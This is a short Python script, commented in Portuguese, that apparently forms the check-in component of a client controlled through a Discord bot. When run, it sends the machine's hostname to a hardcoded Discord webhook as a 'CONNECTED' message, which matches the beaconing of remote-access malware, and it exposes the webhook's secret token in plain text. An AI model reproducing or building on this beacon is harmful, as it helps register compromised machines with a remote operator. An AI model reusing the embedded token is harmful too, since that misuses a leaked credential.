# Arquivo base que conecta o cliente com o bot
# Inicio: 28/04/25
# Ultima atualização: 28/04/25

import requests
import socket

WEBHOOK_URL='https://discord.com/api/webhooks/1366468995846246412/Iaq2erPALGrexe5LgZply4ZGm4mvP1VLejBpvXHpVsQQAjMxE7XU0FPHTclGFKx-qcPt'

def send_connection_message():
    hostname = socket.gethostname()
    message = {
        "content": f"CONNECTED: {hostname}"
    }
    try:
        requests.post(WEBHOOK_URL, json=message)
    except Exception as e:
        print(f"[!] erro ao enviar mensagem: {e}")

if __name__ == "__main__":
    send_connection_message()